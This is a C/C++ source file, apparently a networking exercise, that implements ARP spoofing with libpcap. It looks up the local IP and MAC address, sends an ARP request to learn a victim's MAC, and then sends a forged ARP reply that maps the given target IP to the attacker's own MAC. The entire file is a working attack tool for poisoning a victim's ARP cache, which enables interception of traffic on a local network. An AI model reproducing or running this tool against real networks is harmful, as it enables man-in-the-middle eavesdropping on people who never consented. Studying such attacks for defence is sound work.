#include "send.h"

void get_my_ip(uint8_t * my_ip, char * interface) {
	struct ifreq ifr;
  struct sockaddr_in * sin;
	uint32_t s;

  s = socket(AF_INET, SOCK_DGRAM, 0);
  strncpy(ifr.ifr_name, interface, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error0\n");
		close(s);
		exit(1);
  } 
	else {
		sin = (struct sockaddr_in *)&ifr.ifr_addr;
    memcpy(my_ip, (void*)&sin->sin_addr, sizeof(sin->sin_addr));
		close(s);
  }
}

void get_my_mac(uint8_t * my_mac, char * interface) {
	int sock;
	struct ifreq ifr;
	char mac_adr[18] = {0,};

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)	{
		printf("ERROR1\n");
		exit(1);
	}
	strcpy(ifr.ifr_name, interface);

	if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0) {
		printf("ERROR1\n");
		close(sock);
		exit(1);
	}
	
	memcpy(my_mac, (struct ether_addr *)(ifr.ifr_hwaddr.sa_data), 6);
	close(sock);
}

void send_pkt(uint8_t * d_mac, uint8_t * s_mac, uint8_t * f_mac, uint8_t * d_ip, uint8_t * s_ip, uint16_t arp_operand, pcap_t *fp) {
	ether_header ether;
	arp_header arp;
	int ether_len = sizeof(struct ether_header);
	int arp_len = sizeof(struct arp_header);
	uint8_t * send = NULL;
	send = (uint8_t *)malloc(ether_len + arp_len);
	memcpy(ether.ether_dhost, d_mac, 6);
	memcpy(ether.ether_shost, s_mac, 6);
	ether.ether_type = static_cast<uint16_t>(0x0608);
  arp.arp_hrd = static_cast<uint16_t>(0x0100);
	arp.arp_pro = static_cast<uint16_t>(0x0008);
	arp.arp_hln = static_cast<uint8_t>(6);
	arp.arp_pln = static_cast<uint8_t>(4);
	arp.arp_op = arp_operand;
	memcpy(arp.arp_sha, s_mac, 6);
	memcpy(arp.arp_spa, s_ip, 4);
	memcpy(arp.arp_tha, f_mac, 6);
	memcpy(arp.arp_tpa, d_ip, 4);
	memcpy(send, &ether, ether_len);
	memcpy(send + ether_len, &arp, arp_len);
	if (pcap_sendpacket(fp, send, arp_len + ether_len) != 0) {
		printf("ERROR2\n");
		exit(1);
	}
}
		
void get_sender_mac(uint8_t * my_mac, uint8_t * sender_mac, uint8_t * my_ip, uint8_t * sender_ip, pcap_t *fp) {
	struct pcap_pkthdr * header;
	struct ether_header * ethernet;
	struct arp_header * arp;
	const u_char * packet;
	uint8_t tmp_mac[6] = {static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff)};
	uint8_t tmp1_mac[6] = {0};
	send_pkt(tmp_mac, my_mac, tmp1_mac, sender_ip, my_ip, static_cast<uint16_t>(0x0100), fp);
	while (true) {
		int i, res = pcap_next_ex(fp, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
		ethernet = (struct ether_header *)(packet);
		if ((memcmp(ethernet -> ether_dhost, my_mac, 6) == 0) && (ethernet -> ether_type == static_cast<uint16_t>(0x0608))) {
			memcpy(sender_mac, ethernet -> ether_shost, 6);
			break;
		}
	}
}

void add_to_num(char * address, uint8_t * ip) {
	uint32_t tmp = inet_addr(address);
	memcpy(ip, &tmp, 4);
}

int main(int argc, char * argv[]) {
	if (argc != 4) {
		printf("ERROR4\n");
		return -1;
	}
	char * interface = argv[1];
	char * send_ip = argv[2];
	char * tar_ip = argv[3]; 
	uint8_t my_ip[4];
	uint8_t my_mac[6];
	uint8_t sender_ip[4];
	uint8_t sender_mac[6];
	uint8_t target_ip[4];
	add_to_num(send_ip, sender_ip);
	add_to_num(tar_ip, target_ip);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* fp = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	if (fp == NULL) {
		printf("ERROR3\n");
		exit(1);
	}
	get_my_ip(my_ip, interface);
	get_my_mac(my_mac, interface);
	get_sender_mac(my_mac, sender_mac, my_ip, sender_ip, fp);
	send_pkt(sender_mac, my_mac, sender_mac, sender_ip, target_ip, static_cast<uint16_t>(0x0200), fp);
}
